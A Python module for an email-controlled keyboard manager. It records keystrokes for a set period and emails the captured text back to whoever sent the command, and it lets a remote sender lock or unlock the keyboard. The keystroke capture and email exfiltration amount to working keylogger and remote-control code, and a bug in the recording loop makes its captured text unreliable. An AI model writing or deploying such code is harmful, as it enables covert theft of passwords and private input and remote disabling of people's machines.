import threading, keyboard
import time
import OutLook

import Email
from pynput.keyboard import Listener

class SingletonMeta(type):
    _instances = {}

    def __call__(self, *args, **kwargs):
        if self not in self._instances:
            instance = super().__call__(*args,**kwargs)
            self._instances[self] = instance
        return self._instances[self]


class ManagerKeyBoard(metaclass=SingletonMeta):

    def __init__(self,email):
        self.state = False
        self.mymail = email
        self.repThread = ""

    def getState(self):
        return self.state

    def hook(self, _callBack=None, minute= 60):
        print(self.mymail.__class__)
        print(OutLook.OutLook(None).__class__)
        if(self.mymail.__class__ == OutLook.OutLook(None).__class__ ):
            self.hook_thread(_callBack, minute)
        else:
            threading.Thread(target=self.hook_thread,args=(_callBack,minute)).start()

    def hook_thread(self, _callBack=None, minute= 60):
        self.isHook = True
        thread = threading.Thread(target=self.update_hook)
        thread.start()
        time.sleep(minute)
        self.isHook = False
        thread.join()
        rep = self.repThread
        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), str(rep))
        if self.mymail:
            self.mymail.sendBack(rep, "")

    def update_hook(self):
        print("start recording")
        while self.isHook:
            temp = keyboard.read_key()
            print(temp)
            if(temp == 'space'):
                self.repThread = self.repThread + " "
            elif (len(temp) != 1) :
                self.repThread = self.repThread + " // " + temp + " // "
            else:
                self.repThread = self.repThread + keyboard.read_key()


    def convertToString(self, eventkeyboard):
        result = ""
        for event in eventkeyboard:
            print(event)
            temp = str(event)
            result = result + temp[temp.index('(') + 1]
        return result

    def lock(self,_callBack = None):
        if self.getState() == True:
            rep = "The keyboard state is lock"
        else:
            self.state = True
            for i in range(150):
                keyboard.block_key(i)
            rep = "lock keyboard is success"

        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
        self.mymail.sendBack(rep,"")

    def unlock(self,_callBack = None):

        if self.getState() == False:
            rep = "The keyboard state is unblock"
        else:
            self.state = False
            for i in range(150):
                keyboard.unblock_key(i)
            rep = "unlock keyboard is success"

        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
        self.mymail.sendBack(rep,"")


    def notificationState(self,_callBack = None):

        if self.getState() == True:
            rep = "The keyboard state is block"
        else:
            rep = "The keyboard state is unblock"

        if _callBack:
            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
        self.mymail.sendBack(rep,"")

